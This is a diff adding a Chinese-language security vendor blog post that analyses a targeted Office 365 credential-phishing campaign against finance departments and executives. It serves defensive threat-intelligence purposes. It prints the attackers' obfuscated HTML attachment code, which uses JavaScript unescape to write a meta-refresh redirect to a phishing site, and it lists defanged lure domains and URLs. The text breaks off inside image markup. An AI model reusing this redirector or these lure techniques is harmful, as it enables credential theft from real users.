@@ -1,0 +1,198 @@
+<p><em>本部落格最初於 2021 年 3 月發表在 Area 1 Security 網站上，並在 Cloudflare 於 2022 年 4 月 1 日收購 Area 1 Security 之前發布。<a href="https://blog.cloudflare.com/why-we-are-acquiring-area-1">瞭解更多</a>.</em></p>
+<h3>重點：</h3>
+<ul>
+	<li><em>一場大規模的 Microsoft 365 詐騙活動避開了 Office 365 的原生防禦和其他電子郵件安全防禦措施，將目標對準金融服務、保險和零售業的財務部門、高層主管和執行助理。</em></li>
+	<li><em>攻擊者甚至在關鍵的過渡期間專門針對新當選的執行長。</em></li>
+	<li><em>憑證收集活動利用了各種複雜的技術，包括偽裝各種 Microsoft 365 服務更新；使用 Microsoft 主題的寄件者網域（繞過電子郵件認證）；包括 PDF/HTM/HTML 附件；以及利用高階網路釣魚套件。</em></li>
+	<li><em>儘管 Area 1 阻止了這些活動，但如果活動成功，則攻擊者可能會獲得對第三方敏感性資料的存取權限，以傳送欺詐性發票並發起其他企業電子郵件入侵攻擊。</em></li>
+</ul>
+<p>Area 1 Security 最近阻止了一次複雜的 Microsoft Office 365 憑證收集活動，該活動將目標對準包含金融服務、保險和零售在內的眾多產業中的高層主管、高階助理和財務部門。隨後對該活動進行了進一步的研究和分析，結果顯示規模要比最初發現的大得多。這包括其他幾個直接相關的憑證網路釣魚活動，而這些活動利用複雜的技術和高階網路釣魚套件，繞過 Microsoft 的原生電子郵件防禦和電子郵件認證，對相同產業及相同職位的群體發起攻擊。</p>
+<p>這些活動於 12 月初開始，一直持續到 2 月，僅針對每家公司的特定個人。與「撒網並祈禱」方法（經常可見於這些類型的網路犯罪分子驅動的憑證收集活動中）不同，這種有限的活動表明了一種更具針對性的方法。</p>
+<p>Area 1 Security 阻止的大多數網路釣魚攻擊都是針對各個國際公司的財務總監和財務長。攻擊者以這些公司的財務部門為目標，可能會向其傳送發票和帳單以獲得對第三方敏感性資料的存取權限，這通常稱為企業電子郵件入侵 (BEC) 攻擊。這使得攻擊者能夠從合法的電子郵件地址向供應商傳送偽造的發票，從而導致向攻擊者擁有的帳戶付款。</p>
+<p>除了財務部門，攻擊者還將目標對準公司高層和執行助理。儘管高階助理可以存取高度敏感性資訊，而且總體上擁有更高級別的權限，但以這些員工為目標是一種常被忽視的初始進入方法。</p>
+<p>在少數情況下，攻擊者甚至試圖在公開宣布資深主管重大更換之前誘騙兩家主要公司新當選的執行長。</p>
+<p>透過在這個關鍵的過渡期間傳送網路釣魚訊息，攻擊者可能希望在新任執行長專注於應對經營企業帶來的新挑戰時，讓他們措手不及。</p>
+<p><strong>這些網路釣魚活動最值得注意的是威脅執行者在攻擊的每一步都採用了複雜的方法。</strong></p>
+<p>他們所採用的巧妙策略不僅用於製作網路釣魚訊息，還用於傳送這些訊息以及獲取密碼。使用這些方法在每個步驟中部署了許多技術，包括看似合法的網域和登入頁面及高階網路釣魚套件，以繞過電子郵件認證和 Microsoft 的電子郵件防禦。</p>
+<p>很明顯，與典型的憑證收集策劃者相比，這些攻擊背後的操縱者具有高於平均水平的技能。</p>
+<h3>不太安全的「Office 365 更新」</h3>
+<p>第一次憑證收集活動最初繞過 Microsoft 的防禦和其他電子郵件安全層級，然後被 Area 1 Security 發現，涉及的電子郵件包含所謂的套用 Office 365 安全更新相關說明，如圖 1 所示。</p>
+<p>圖 1. 含 Office 365 品牌詐騙的網路釣魚訊息</p>
+<figure class="emdash-image pt-portable-image" data-astro-cid-7nvefuv6="">
+	<div class="pt-portable-image-frame" data-image-placeholder-frame="" data-astro-cid-7nvefuv6=""><img class="pt-portable-image-placeholder" data-image-placeholder="" src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%201%201%22%3E%3Crect%20width%3D%221%22%20height%3D%221%22%20fill%3D%22rgb(243%2C243%2C243)%22%2F%3E%3C%2Fsvg%3E" alt="" width="715" height="296" loading="eager" decoding="async" aria-hidden="true" data-astro-cid-7nvefuv6=""><img src="/_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW49GKMY9X7XHWY936D1EF4D.png&amp;w=715&amp;h=296&amp;f=webp&amp;fit=cover&amp;position=center" srcset="/_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW49GKMY9X7XHWY936D1EF4D.png&amp;w=640&amp;h=265&amp;f=webp&amp;fit=cover&amp;position=center 640w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW49GKMY9X7XHWY936D1EF4D.png&amp;w=715&amp;h=296&amp;f=webp&amp;fit=cover&amp;position=center 715w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW49GKMY9X7XHWY936D1EF4D.png&amp;w=750&amp;h=310&amp;f=webp&amp;fit=cover&amp;position=center 750w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW49GKMY9X7XHWY936D1EF4D.png&amp;w=828&amp;h=343&amp;f=webp&amp;fit=cover&amp;position=center 828w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW49GKMY9X7XHWY936D1EF4D.png&amp;w=1080&amp;h=447&amp;f=webp&amp;fit=cover&amp;position=center 1080w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW49GKMY9X7XHWY936D1EF4D.png&amp;w=1280&amp;h=530&amp;f=webp&amp;fit=cover&amp;position=center 1280w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW49GKMY9X7XHWY936D1EF4D.png&amp;w=1430&amp;h=592&amp;f=webp&amp;fit=cover&amp;position=center 1430w" alt="Figure 1. Phishing Message with Office 365 Brand Spoof" loading="lazy" decoding="async" data-image-placeholder-media="true" data-lightbox-src="/_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW49GKMY9X7XHWY936D1EF4D.png&amp;w=1158&amp;h=480&amp;f=webp" data-lightbox-width="1158" data-lightbox-height="480" data-astro-cid-7nvefuv6="true" sizes="(min-width: 715px) 715px, 100vw" data-astro-image="constrained" data-astro-image-fit="cover" data-astro-image-pos="center" width="715" height="296" class="pt-portable-image-media"></div>
+</figure>
+<script type="module" src="/_astro/PTImage.astro_astro_type_script_index_0_lang.ihQLl0PR.js"></script>
+<p>大量網路釣魚訊息的主旨為「重要服務變更」，並包含許多寄件者顯示名稱，範圍從一般的「無回覆」地址到公司特定名稱。</p>
+<p>但是，正如在其他相關活動中觀察到的那樣，其他主旨列包括「PDF 新政策」、「PDF 服務」和「收到來自無法辨識來電者 ID 的語音訊息」。這些相關活動還透過在主旨列中加入目標公司的名稱來客製化訊息。</p>
+<p>為了增加訊息的合法性，**絕大多數觀察到的網路釣魚電子郵件寄送地址都具有 Microsoft 主題的寄件者網域，**比如 microsoftoutlookwebservices[.]online 和 outlookonlinewebservices-com[.]online。攻擊者還為這些網域正確設定 SPF 記錄，以更好地確保其訊息通過電子郵件認證。</p>
+<p>為了進一步避免被偵測出來，威脅執行者在註冊後不久就會利用其 Microsoft 假冒網域進行網路釣魚攻擊。</p>
+<p>這種快速的網域註冊處理是詐騙者慣用伎倆，他們希望在新註冊的網域被識別為網路釣魚基礎結構之前誘騙盡可能多的受害者。</p>
+<p>在某些情況下，攻擊者甚至入侵了良性的電子郵件帳戶，並使用這些帳戶傳送網路釣魚訊息，試圖阻止歸因於已知的執行者控制的網路釣魚基礎結構。他們還偽造了設定不當的合法寄件者網域的電子郵件地址，利用電子郵件認證通訊協定中的固有弱點，使他們能夠輕鬆逃避網路釣魚防護解決方案。</p>
+<p>大多數公司普遍缺乏安全意識，而攻擊者正好利用這一點，使用 Microsoft 主題的更新誘餌發起攻擊。Microsoft 不會主動透過電子郵件給終端使用者傳送安全警示和此性質的更新，這應該是不正當行為的第一個跡象。最多每月向網路管理員傳送一次安全通知，詳細說明最近的常見弱點和漏洞 (CVE)。</p>
+<p><strong>但是，有關企業的安全更新程序的知識，除了 IT 部門人員熟知外，相當數量的員工並不熟悉，因此他們也就很容易落入這種網路釣魚的陷阱。</strong></p>
+<p>具有諷刺意味的是，詐騙者不斷從圍繞持續的網路安全恐慌的焦慮中獲利，就像現在臭名昭著的 SolarWinds 漏洞一樣，他們知道目標很可能會點選，原因在於他們擔心自己的不合規行為可能成為另一個漏洞的來源。</p>
+<h3>請參閱「套用更新」的附件</h3>
+<p>網路釣魚訊息包含足夠的細節，以引誘毫無防備的目標開啟 PDF，HTML 或 HTM 檔案等附件。圖 2. 是 PDF 附件的範例，其中包含編輯過的目標資訊，包括全名、電子郵件地址和公司標誌。</p>
+<p>圖 2. 包含連結至 Office 365 憑證收集器的 PDF 附件範例</p>
+<figure class="emdash-image pt-portable-image" data-astro-cid-7nvefuv6="">
+	<div class="pt-portable-image-frame" data-image-placeholder-frame="" data-astro-cid-7nvefuv6=""><img class="pt-portable-image-placeholder" data-image-placeholder="" src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%201%201%22%3E%3Crect%20width%3D%221%22%20height%3D%221%22%20fill%3D%22rgb(243%2C243%2C243)%22%2F%3E%3C%2Fsvg%3E" alt="" width="715" height="1021" loading="eager" decoding="async" aria-hidden="true" data-astro-cid-7nvefuv6=""><img src="/_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW45Y4TDM29DADSH0AREPMQV.png&amp;w=715&amp;h=1021&amp;f=webp&amp;fit=cover&amp;position=center" srcset="/_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW45Y4TDM29DADSH0AREPMQV.png&amp;w=640&amp;h=914&amp;f=webp&amp;fit=cover&amp;position=center 640w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW45Y4TDM29DADSH0AREPMQV.png&amp;w=715&amp;h=1021&amp;f=webp&amp;fit=cover&amp;position=center 715w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW45Y4TDM29DADSH0AREPMQV.png&amp;w=750&amp;h=1071&amp;f=webp&amp;fit=cover&amp;position=center 750w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW45Y4TDM29DADSH0AREPMQV.png&amp;w=828&amp;h=1182&amp;f=webp&amp;fit=cover&amp;position=center 828w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW45Y4TDM29DADSH0AREPMQV.png&amp;w=1080&amp;h=1542&amp;f=webp&amp;fit=cover&amp;position=center 1080w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW45Y4TDM29DADSH0AREPMQV.png&amp;w=1280&amp;h=1828&amp;f=webp&amp;fit=cover&amp;position=center 1280w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW45Y4TDM29DADSH0AREPMQV.png&amp;w=1430&amp;h=2042&amp;f=webp&amp;fit=cover&amp;position=center 1430w" alt="Figure 2. Example PDF Attachment with Link to Office 365 Credential Harvester" loading="lazy" decoding="async" data-image-placeholder-media="true" data-lightbox-src="/_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW45Y4TDM29DADSH0AREPMQV.png&amp;w=976&amp;h=1394&amp;f=webp" data-lightbox-width="976" data-lightbox-height="1394" data-astro-cid-7nvefuv6="true" sizes="(min-width: 715px) 715px, 100vw" data-astro-image="constrained" data-astro-image-fit="cover" data-astro-image-pos="center" width="715" height="1021" class="pt-portable-image-media"></div>
+</figure>
+<p>大多數目標電子郵件帳戶都遵循格式 &lt;名字.姓氏&gt;@&lt;公司網域&gt;，從自動化的角度來看，將全名包含在附件中相當容易。不過，即使在電子郵件地址中僅出現首字母縮寫的情況下，攻擊者仍然設法在 PDF 附件中包含目標的全名。這表明威脅執行者進行了額外的偵察，以精心製作他們的網路釣魚誘餌。</p>
+<p>為了滿足攻擊者的要求並「安裝」虛假的安全更新，目標需要按一下「套用更新」按鈕，隨後會前往數個偽造的 Office 365 登入頁面之一。只有在目標收到 PDF 附件時，才需要載入憑證收集網站的附加步驟。</p>
+<p>對於 HTML 和 HTM 附件，開啟檔案後，憑證收集網站隨即自動載入到受害者的瀏覽器中。如圖 3 所示，為了避免被偵測出來，攻擊者試圖使用 JavaScript 逸出函數對載入惡意網頁的 HTML 進行編碼。</p>
+<p>如圖 4 所示，一旦程式碼未逸出，您可以看到攻擊者如何使用 HTML「中繼」refresh 來引導受害者的瀏覽器載入憑證收集網站。</p>
+<div class="emdash-code">
+	<pre class="shiki shiki-themes github-light vesper" tabindex="0"><code><span class="line"><span class="sk-24292e-a0a0a0">&lt;!</span><span class="sk-22863a-ffc799">DOCTYPE</span><span class="sk-6f42c1-ffc799"> html</span><span class="sk-24292e-a0a0a0">&gt;</span></span>
+<span class="line"><span class="sk-24292e-a0a0a0">&lt;</span><span class="sk-22863a-ffc799">html</span><span class="sk-6f42c1-ffc799"> dir</span><span class="sk-24292e-fff">=</span><span class="sk-032f62-99ffe4">"ltr"</span><span class="sk-6f42c1-ffc799"> xmlns</span><span class="sk-24292e-fff">=</span><span class="sk-032f62-99ffe4">"http://www.w3.org/1999/xhtml"</span><span class="sk-24292e-a0a0a0">&gt;</span></span>
+<span class="line"><span class="sk-24292e-a0a0a0">&lt;</span><span class="sk-22863a-ffc799">head</span><span class="sk-24292e-a0a0a0">&gt;</span></span>
+<span class="line"><span class="sk-24292e-a0a0a0">&lt;</span><span class="sk-22863a-ffc799">script</span><span class="sk-6f42c1-ffc799"> language</span><span class="sk-24292e-fff">=</span><span class="sk-032f62-99ffe4">"javascript"</span><span class="sk-24292e-a0a0a0">&gt;</span><span class="sk-24292e-fff">document.</span><span class="sk-6f42c1-ffc799">write</span><span class="sk-24292e-fff">(</span><span class="sk-6f42c1-ffc799">unescape</span><span class="sk-24292e-fff">(</span><span class="sk-032f62-99ffe4">'%3C%6D%65%74%61%20%68%74%74%70%2D%65%71%75%69%76%3D%22%72%65%66%72%65%73%68%22%20%63%6F%6E%74%65%6E%74%3D%22%31%3B%68%74%74%70%73%3A%2F%2F%6C%6F%67%69%6E%2E%6D%69%63%72%6F%73%6F%66%74%6F%66%66%69%63%65%6F%6E%6C%69%6E%65%73%65%72%76%69%63%65%73%2E%63%6F%6D%3F%65%3D'</span><span class="sk-24292e-fff">));</span><span class="sk-24292e-a0a0a0">&lt;/</span><span class="sk-22863a-ffc799">script</span><span class="sk-24292e-a0a0a0">&gt;</span></span>
+<span class="line"><span class="sk-24292e-a0a0a0">&lt;</span><span class="sk-22863a-ffc799">script</span><span class="sk-6f42c1-ffc799"> src</span><span class="sk-24292e-fff">=</span><span class="sk-032f62-99ffe4">"https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"</span><span class="sk-24292e-a0a0a0">&gt;&lt;/</span><span class="sk-22863a-ffc799">script</span><span class="sk-24292e-a0a0a0">&gt;</span></span>
+<span class="line"><span class="sk-24292e-a0a0a0">&lt;</span><span class="sk-22863a-ffc799">title</span><span class="sk-24292e-a0a0a0">&gt;</span><span class="sk-24292e-fff">Outlook</span><span class="sk-24292e-a0a0a0">&lt;/</span><span class="sk-22863a-ffc799">title</span><span class="sk-24292e-a0a0a0">&gt;</span></span></code></pre>
+</div>
+<p><strong>這個功能是相當高階的網路釣魚套件的一小部分，至少在最初階段，攻擊者使用該套件能在被 Area 1 Security 識別和阻止之前躲過 Microsoft 的 Office 365 原生防禦和其他幾個電子郵件安全解決方案。</strong></p>
+<div class="emdash-code">
+	<pre class="shiki shiki-themes github-light vesper" tabindex="0"><code><span class="line"><span class="sk-24292e-a0a0a0">&lt;</span><span class="sk-22863a-ffc799">meta</span><span class="sk-6f42c1-ffc799"> http-equiv</span><span class="sk-24292e-fff">=</span><span class="sk-032f62-99ffe4">"refresh"</span><span class="sk-6f42c1-ffc799"> content</span><span class="sk-24292e-fff">=</span><span class="sk-032f62-99ffe4">"1;hxxps://login.microsoftofficeonlineservices[.]com?e=</span><span class="sk-b31d28-ff8080 sk-fs-italic-inherit">&lt;</span><span class="sk-032f62-99ffe4">base64 encoded target email"</span><span class="sk-24292e-a0a0a0">&gt;</span></span></code></pre>
+</div>
+<h3>隱秘的 Office 365 網路釣魚網站和網路釣魚套件</h3>
+<p>一旦目標開啟 HTML 或 HTM 附件，或按一下「套用更新」按鈕，其瀏覽器就會透過 JavaScript 或中繼欄位追蹤一系列 HTTP 重新導向和用戶端重新導向。例如，Area 1 Security 觀察到的網路釣魚訊息中的其中一個連結包括：</p>
+<p><code>hxxps://simpus3.bandungkab.go[.]id/?username=&lt;_base64 encoded target email address_&gt;</code></p>
+<p>若已點選，目標的瀏覽器將重新引導到 URL：</p>
+<p>如圖 5 所示，此 URL 連結至憑證收集器的登入頁面，該頁面顯示了一個非常有說服力的 Microsoft 主題「隱私權政策」聲明。</p>
+<div class="emdash-code">
+	<pre class="shiki shiki-themes github-light vesper" tabindex="0"><code><span class="line"><span class="sk-6f42c1-ffc799">hxxps://microsoftofficeonlineservices[.]outlookprivacypolicy[.]online/common/?client_id</span><span class="sk-032f62-99ffe4">=4345a7b9-9a63-4910-a426-35363201d503</span><span class="sk-24292e-fff">&amp;response_mode</span><span class="sk-d73a49-a0a0a0">=</span><span class="sk-032f62-99ffe4">form_post</span><span class="sk-24292e-fff">&amp;response_type</span><span class="sk-d73a49-a0a0a0">=</span><span class="sk-032f62-99ffe4">code+id_token</span><span class="sk-24292e-fff">&amp;scope</span><span class="sk-d73a49-a0a0a0">=</span><span class="sk-032f62-99ffe4">openid+profile</span><span class="sk-24292e-fff">&amp;state</span><span class="sk-d73a49-a0a0a0">=</span><span class="sk-032f62-99ffe4">OpenIdConnect.AuthenticationProperties%3dKZeFMEdbUJBGtfhET_m7HpFINC_qWyaoYc_JS_C5znhJs0YOuquvhkEmzMzK3Ntri00CKVrHEJkyja-3DIXEvtgEaRE5mZ-jAKkVOhjSG4ud7eS1OSBeHlkBsB4tQsqP</span><span class="sk-24292e-fff">&amp;nonce</span><span class="sk-d73a49-a0a0a0">=</span><span class="sk-032f62-99ffe4">637037128007965152.ODZmZWY4MGMtYzYwNC00M2NjLThmZWEtYmE4OTJiNmI1MWE2OWQwYWVkZWQtMjE2My00ZDcyLWEwN2UtN2M3ODA3OGZiNWY3</span><span class="sk-24292e-fff">&amp;redirect_uri</span><span class="sk-d73a49-a0a0a0">=</span><span class="sk-032f62-99ffe4">https%3a%2f%2fwww[.</span><span class="sk-24292e-fff">]office[.]com%2f&amp;ui_locales</span><span class="sk-d73a49-a0a0a0">=</span><span class="sk-032f62-99ffe4">en-US</span><span class="sk-24292e-fff">&amp;mkt</span><span class="sk-d73a49-a0a0a0">=</span><span class="sk-032f62-99ffe4">en-US</span><span class="sk-24292e-fff">&amp;client-request-id</span><span class="sk-d73a49-a0a0a0">=</span><span class="sk-032f62-99ffe4">c36fe010-0bb6-4e01-94f8-a8683b752a6d</span></span></code></pre>
+</div>
+<p>圖 5. 虛假 Microsoft 隱私權政策聲明</p>
+<figure class="emdash-image pt-portable-image" data-astro-cid-7nvefuv6="">
+	<div class="pt-portable-image-frame" data-image-placeholder-frame="" data-astro-cid-7nvefuv6=""><img class="pt-portable-image-placeholder" data-image-placeholder="" src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%201%201%22%3E%3Crect%20width%3D%221%22%20height%3D%221%22%20fill%3D%22rgb(243%2C243%2C243)%22%2F%3E%3C%2Fsvg%3E" alt="" width="715" height="355" loading="eager" decoding="async" aria-hidden="true" data-astro-cid-7nvefuv6=""><img src="/_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW493VGMHPZ143XB9SRSTQPH.png&amp;w=715&amp;h=355&amp;f=webp&amp;fit=cover&amp;position=center" srcset="/_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW493VGMHPZ143XB9SRSTQPH.png&amp;w=640&amp;h=318&amp;f=webp&amp;fit=cover&amp;position=center 640w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW493VGMHPZ143XB9SRSTQPH.png&amp;w=715&amp;h=355&amp;f=webp&amp;fit=cover&amp;position=center 715w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW493VGMHPZ143XB9SRSTQPH.png&amp;w=750&amp;h=372&amp;f=webp&amp;fit=cover&amp;position=center 750w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW493VGMHPZ143XB9SRSTQPH.png&amp;w=828&amp;h=411&amp;f=webp&amp;fit=cover&amp;position=center 828w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW493VGMHPZ143XB9SRSTQPH.png&amp;w=1080&amp;h=536&amp;f=webp&amp;fit=cover&amp;position=center 1080w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW493VGMHPZ143XB9SRSTQPH.png&amp;w=1280&amp;h=636&amp;f=webp&amp;fit=cover&amp;position=center 1280w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW493VGMHPZ143XB9SRSTQPH.png&amp;w=1430&amp;h=710&amp;f=webp&amp;fit=cover&amp;position=center 1430w" alt="Figure 5. Fake Microsoft Privacy Policy Statement" loading="lazy" decoding="async" data-image-placeholder-media="true" data-lightbox-src="/_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW493VGMHPZ143XB9SRSTQPH.png&amp;w=1920&amp;h=953&amp;f=webp" data-lightbox-width="1920" data-lightbox-height="953" data-astro-cid-7nvefuv6="true" sizes="(min-width: 715px) 715px, 100vw" data-astro-image="constrained" data-astro-image-fit="cover" data-astro-image-pos="center" width="715" height="355" class="pt-portable-image-media"></div>
+</figure>
+<p>在頁面的右上角是經過 Photoshop 軟體處理過的獨特 Microsoft 標誌影像。Area 1 Security 研究人員將此影像覆蓋在黑色背景上，如下圖所示，以突出顯示攻擊者編輯原始標誌的位置。</p>
+<p>圖 6. 經過 Photoshop 軟體處理過的 Microsoft 標誌</p>
+<figure class="emdash-image pt-portable-image" data-astro-cid-7nvefuv6="">
+	<div class="pt-portable-image-frame" data-image-placeholder-frame="" data-astro-cid-7nvefuv6=""><img class="pt-portable-image-placeholder" data-image-placeholder="" src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%201%201%22%3E%3Crect%20width%3D%221%22%20height%3D%221%22%20fill%3D%22rgb(243%2C243%2C243)%22%2F%3E%3C%2Fsvg%3E" alt="" width="187" height="120" loading="eager" decoding="async" aria-hidden="true" data-astro-cid-7nvefuv6=""><img src="/_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW47RTVB3RSJ3B05XGNQVXN8.png&amp;w=187&amp;h=120&amp;f=webp&amp;fit=cover&amp;position=center" srcset="/_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW47RTVB3RSJ3B05XGNQVXN8.png&amp;w=187&amp;h=120&amp;f=webp&amp;fit=cover&amp;position=center 187w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW47RTVB3RSJ3B05XGNQVXN8.png&amp;w=374&amp;h=240&amp;f=webp&amp;fit=cover&amp;position=center 374w" alt="BLOG-1437 Embedded Image - 9T1iCK" loading="lazy" decoding="async" data-image-placeholder-media="true" data-lightbox-src="/_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW47RTVB3RSJ3B05XGNQVXN8.png&amp;w=187&amp;h=120&amp;f=webp" data-lightbox-width="187" data-lightbox-height="120" data-astro-cid-7nvefuv6="true" sizes="(min-width: 187px) 187px, 100vw" data-astro-image="constrained" data-astro-image-fit="cover" data-astro-image-pos="center" width="187" height="120" class="pt-portable-image-media"></div>
+</figure>
+<p>若目標按一下隱私權政策聲明上的「接受」按鈕，則會進一步將其重新導向至虛假的 Office 365 登入頁面：</p>
+<p>該頁面看起來與合法登入相同，而且為了看起來更具說服力，還動態載入了與目標公司網域關聯的標誌。更具體地說，出現在目標電子郵件地址的網域用於從網站 logo.clearbit.com 中獲取公司標誌（即 <a href="http://logo.clearbit.com" target="_blank" rel="noopener noreferrer">http://logo.clearbit.com/</a>&lt;出現在目標電子郵件地址的網域&gt;）。為了演示目的，虛假電子郵件「<a href="mailto:admin@google.com">admin@google[.]com</a>」用於說明網路釣魚套件如何根據「受害者」電子郵件地址中找到的「google.com」網域顯示 Google 標誌。</p>
+<div class="emdash-code">
+	<pre class="shiki shiki-themes github-light vesper" tabindex="0"><code><span class="line"><span class="sk-6f42c1-ffc799">hxxps://microsoftofficeonlineservices[.]outlookprivacypolicy[.]online/common/oauth2-authorize/#client_id</span><span class="sk-032f62-99ffe4">=4345a7b9-9a63-4910-a426-35363201d503</span><span class="sk-24292e-fff">&amp;response_mode</span><span class="sk-d73a49-a0a0a0">=</span><span class="sk-032f62-99ffe4">form_post</span><span class="sk-24292e-fff">&amp;response_type</span><span class="sk-d73a49-a0a0a0">=</span><span class="sk-032f62-99ffe4">code+id_token</span><span class="sk-24292e-fff">&amp;scope</span><span class="sk-d73a49-a0a0a0">=</span><span class="sk-032f62-99ffe4">openid+profile</span><span class="sk-24292e-fff">&amp;state</span><span class="sk-d73a49-a0a0a0">=</span><span class="sk-032f62-99ffe4">OpenIdConnect.AuthenticationProperties%3dKZeFMEdbUJBGtfhET_m7HpFINC_qWyaoYc_JS_C5znhJs0YOuquvhkEmzMzK3Ntri00CKVrHEJkyja-3DIXEvtgEaRE5mZ-jAKkVOhjSG4ud7eS1OSBeHlkBsB4tQsqP</span><span class="sk-24292e-fff">&amp;nonce</span><span class="sk-d73a49-a0a0a0">=</span><span class="sk-032f62-99ffe4">637037128007965152.ODZmZWY4MGMtYzYwNC00M2NjLThmZWEtYmE4OTJiNmI1MWE2OWQwYWVkZWQtMjE2My00ZDcyLWEwN2UtN2M3ODA3OGZiNWY3</span><span class="sk-24292e-fff">&amp;redirect_uri</span><span class="sk-d73a49-a0a0a0">=</span><span class="sk-032f62-99ffe4">https%3a%2f%2fwww[.</span><span class="sk-24292e-fff">]office[.]com%2f&amp;ui_locales</span><span class="sk-d73a49-a0a0a0">=</span><span class="sk-032f62-99ffe4">en-US</span><span class="sk-24292e-fff">&amp;mkt</span><span class="sk-d73a49-a0a0a0">=</span><span class="sk-032f62-99ffe4">en-US</span><span class="sk-24292e-fff">&amp;client-request-id</span><span class="sk-d73a49-a0a0a0">=</span><span class="sk-032f62-99ffe4">c36fe010-0bb6-4e01-94f8-a8683b752a6d</span><span class="sk-24292e-fff"> </span></span></code></pre>
+</div>
+<p>圖 7. 虛假 Office 365 登入</p>
+<figure class="emdash-image pt-portable-image" data-astro-cid-7nvefuv6="">
+	<div class="pt-portable-image-frame" data-image-placeholder-frame="" data-astro-cid-7nvefuv6=""><img class="pt-portable-image-placeholder" data-image-placeholder="" src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%201%201%22%3E%3Crect%20width%3D%221%22%20height%3D%221%22%20fill%3D%22rgb(243%2C243%2C243)%22%2F%3E%3C%2Fsvg%3E" alt="" width="715" height="555" loading="eager" decoding="async" aria-hidden="true" data-astro-cid-7nvefuv6=""><img src="/_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW45Z4GF8RY261PT6XZ31241.png&amp;w=715&amp;h=555&amp;f=webp&amp;fit=cover&amp;position=center" srcset="/_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW45Z4GF8RY261PT6XZ31241.png&amp;w=640&amp;h=497&amp;f=webp&amp;fit=cover&amp;position=center 640w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW45Z4GF8RY261PT6XZ31241.png&amp;w=715&amp;h=555&amp;f=webp&amp;fit=cover&amp;position=center 715w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW45Z4GF8RY261PT6XZ31241.png&amp;w=750&amp;h=582&amp;f=webp&amp;fit=cover&amp;position=center 750w, 